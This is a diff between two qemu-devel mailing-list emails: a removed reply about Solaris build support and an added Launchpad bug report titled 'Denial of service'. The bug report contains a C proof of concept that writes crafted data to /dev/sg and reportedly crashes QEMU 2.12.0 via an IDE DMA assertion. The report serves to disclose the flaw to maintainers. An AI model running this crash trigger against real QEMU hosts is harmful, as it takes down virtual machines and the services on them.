@@ -1,25 +1,33 @@
-Received: from eggs.gnu.org ([2001:4830:134:3::10]:36395)
+Received: from eggs.gnu.org ([2001:4830:134:3::10]:36927)
 	by lists.gnu.org with esmtp (Exim 4.71)
-	(envelope-from <armbru@redhat.com>) id 1fUn8u-0001Cs-Rt
-	for qemu-devel@nongnu.org; Mon, 18 Jun 2018 01:55:57 -0400
+	(envelope-from <bounces@canonical.com>) id 1fUnDl-0002iu-66
+	for qemu-devel@nongnu.org; Mon, 18 Jun 2018 02:00:58 -0400
 Received: from Debian-exim by eggs.gnu.org with spam-scanned (Exim 4.71)
-	(envelope-from <armbru@redhat.com>) id 1fUn8o-0006KM-8M
-	for qemu-devel@nongnu.org; Mon, 18 Jun 2018 01:55:56 -0400
-Received: from mx3-rdu2.redhat.com ([66.187.233.73]:41882 helo=mx1.redhat.com)
-	by eggs.gnu.org with esmtps (TLS1.0:DHE_RSA_AES_256_CBC_SHA1:32)
-	(Exim 4.71) (envelope-from <armbru@redhat.com>) id 1fUn8o-0006J6-3u
-	for qemu-devel@nongnu.org; Mon, 18 Jun 2018 01:55:50 -0400
-From: Markus Armbruster <armbru@redhat.com>
-References: <152916202234.7686.15264921741576357687.malonedeb@wampee.canonical.com>
-	<152917734027.26681.6190895101387091472.malone@gac.canonical.com>
-Date: Mon, 18 Jun 2018 07:55:47 +0200
-In-Reply-To: <152917734027.26681.6190895101387091472.malone@gac.canonical.com>
-	(Thomas Huth's message of "Sat, 16 Jun 2018 19:29:00 -0000")
-Message-ID: <87h8m0sknw.fsf@dusky.pond.sub.org>
+	(envelope-from <bounces@canonical.com>) id 1fUnDh-0000Ga-6M
+	for qemu-devel@nongnu.org; Mon, 18 Jun 2018 02:00:57 -0400
+Received: from indium.canonical.com ([91.189.90.7]:42500)
+	by eggs.gnu.org with esmtps (TLS1.0:RSA_AES_128_CBC_SHA1:16)
+	(Exim 4.71) (envelope-from <bounces@canonical.com>)
+	id 1fUnDg-0000GH-W1
+	for qemu-devel@nongnu.org; Mon, 18 Jun 2018 02:00:53 -0400
+Received: from loganberry.canonical.com ([91.189.90.37])
+	by indium.canonical.com with esmtp (Exim 4.86_2 #2 (Debian))
+	id 1fUnDf-00032l-Sz
+	for <qemu-devel@nongnu.org>; Mon, 18 Jun 2018 06:00:51 +0000
+Received: from loganberry.canonical.com (localhost [127.0.0.1])
+	by loganberry.canonical.com (Postfix) with ESMTP id B8C1A2E8019
+	for <qemu-devel@nongnu.org>; Mon, 18 Jun 2018 06:00:51 +0000 (UTC)
 MIME-Version: 1.0
-Content-Type: text/plain
-Subject: Re: [Qemu-devel] [Bug 1777252] Re: tests/Makefile.include trying to
- add linking library '-lutil' that break the build on Solaris
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+Date: Mon, 18 Jun 2018 05:52:48 -0000
+From: Thomas Huth <1777315@bugs.launchpad.net>
+Reply-To: Bug 1777315 <1777315@bugs.launchpad.net>
+Sender: bounces@canonical.com
+References: <152923423559.26799.9467570390321302567.malonedeb@gac.canonical.com>
+Message-Id: <152930116851.27230.14961975405216231232.malone@gac.canonical.com>
+Errors-To: bounces@canonical.com
+Subject: [Qemu-devel] [Bug 1777315] Re: Denial of service
 List-Id: <qemu-devel.nongnu.org>
 List-Unsubscribe: <https://lists.nongnu.org/mailman/options/qemu-devel>,
 	<mailto:qemu-devel-request@nongnu.org?subject=unsubscribe>
@@ -28,34 +36,101 @@ List-Post: <mailto:qemu-devel@nongnu.org>
 List-Help: <mailto:qemu-devel-request@nongnu.org?subject=help>
 List-Subscribe: <https://lists.nongnu.org/mailman/listinfo/qemu-devel>,
 	<mailto:qemu-devel-request@nongnu.org?subject=subscribe>
-To: Thomas Huth <1777252@bugs.launchpad.net>
-Cc: qemu-devel@nongnu.org
+To: qemu-devel@nongnu.org
 
-Thomas Huth <1777252@bugs.launchpad.net> writes:
+Are you going to provide a patch for this to the mailing list? (since
+you've assigned the bug to yourself)
 
-> I'm sorry, but Solaris is currently unsupported and might get removed in
-> a future release, see:
->
->  https://wiki.qemu.org/ChangeLog/2.12#Warning:_unsupported_host_systems
+-- =
 
-Quote configure:
+You received this bug notification because you are a member of qemu-
+devel-ml, which is subscribed to QEMU.
+https://bugs.launchpad.net/bugs/1777315
 
-if test "$supported_os" = "no"; then
-    echo
-    echo "WARNING: SUPPORT FOR THIS HOST OS WILL GO AWAY IN FUTURE RELEASES!"
-    echo
-    echo "Host OS $targetos support is not currently maintained."
-    echo "The QEMU project intends to remove support for this host OS in"
-    echo "a future release if nobody volunteers to maintain it and to"
-    echo "provide a build host for our continuous integration setup."
-    echo "configure has succeeded and you can continue to build, but"
-    echo "if you care about QEMU on this platform you should contact"
-    echo "us upstream at qemu-devel@nongnu.org."
-fi
+Title:
+  Denial of service
 
-> So it would be great if you could contribute patches, or find someone
-> who's willing to maintain QEMU on Solaris.
+Status in QEMU:
+  New
 
-The key phrase here is "provide a build host for our continuous
-integration setup".  Once that's in place, continuing maintenance
-shouldn't be hard.
+Bug description:
+  Hi,
+  QEMU 'hw/ide/core.c:871' Denial of Service Vulnerability in version qemu-=
+2.12.0
+
+  run the program in qemu-2.12.0:
+  #define _GNU_SOURCE =
+
+  #include <endian.h>
+  #include <sys/syscall.h>
+  #include <unistd.h>
+  #include <fcntl.h>
+  #include <stdio.h>
+  #include <string.h>
+  #include <sys/stat.h>
+  #include <stdint.h>
+  #include <string.h>
+
+  static uintptr_t syz_open_dev(uintptr_t a0, uintptr_t a1, uintptr_t a2)
+  {
+          if (a0 =3D=3D 0xc || a0 =3D=3D 0xb) {
+                  char buf[128];
+                  sprintf(buf, "/dev/%s/%d:%d", a0 =3D=3D 0xc ? "char" : "b=
+lock", (uint8_t)a1, (uint8_t)a2);
+                  return open(buf, O_RDWR, 0);
+          } else {
+                  char buf[1024];
+                  char* hash;
+  strncpy(buf, (char*)a0, sizeof(buf) - 1);
+                  buf[sizeof(buf) - 1] =3D 0;
+                  while ((hash =3D strchr(buf, '#'))) {
+                          *hash =3D '0' + (char)(a1 % 10);
+                          a1 /=3D 10;
+                  }
+                  return open(buf, a2, 0);
+          }
+  }
+
+  uint64_t r[2] =3D {0xffffffffffffffff, 0xffffffffffffffff};
+  void loop()
+  {
+          long res =3D 0;
+  memcpy((void*)0x20000000, "/dev/sg#", 9);
+          res =3D syz_open_dev(0x20000000, 0, 2);
+          if (res !=3D -1)
+                  r[0] =3D res;
+          res =3D syscall(__NR_dup2, r[0], r[0]);
+          if (res !=3D -1)
+                  r[1] =3D res;
+  *(uint8_t*)0x20000ec0 =3D 0;
+  *(uint8_t*)0x20000ec1 =3D 0;
+  *(uint8_t*)0x20000ec2 =3D 0;
+  *(uint8_t*)0x20000ec3 =3D 0;
+  *(uint32_t*)0x20000ec8 =3D 0;
+  *(uint8_t*)0x20000ed8 =3D 0;
+  *(uint8_t*)0x20000ed9 =3D 0;
+  *(uint8_t*)0x20000eda =3D 0;
+  *(uint8_t*)0x20000edb =3D 0;
+  memcpy((void*)0x20000ee0, "\x9c\x4d\xe7\xd5\x0a\x62\x43\xa7\x77\x53\x67\x=
+b3", 12);
+          syscall(__NR_write, r[1], 0x20000ec0, 0x323);
+  }
+
+  int main()
+  {
+          syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
+          loop();
+          return 0;
+  }
+  this will crash qemu, output information:
+   qemu-system-x86_64: hw/ide/core.c:843: ide_dma_cb: Assertion `n * 512 =
+=3D=3D s->sg.size' failed.
+
+  =
+
+  Thanks =
+
+  owl337
+
+To manage notifications about this bug go to:
+https://bugs.launchpad.net/qemu/+bug/1777315/+subscriptions
